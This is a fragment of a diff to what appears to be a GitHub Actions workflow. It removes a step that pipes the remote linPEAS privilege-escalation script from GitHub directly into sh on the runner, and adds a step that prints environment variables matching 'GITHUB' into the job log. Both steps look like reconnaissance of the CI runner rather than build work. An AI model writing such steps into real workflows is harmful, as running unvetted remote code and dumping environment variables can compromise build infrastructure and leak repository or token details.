@@ -5,8 +5,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |     
-            curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
-            
+            env | grep -i GITHUB
 
 
 
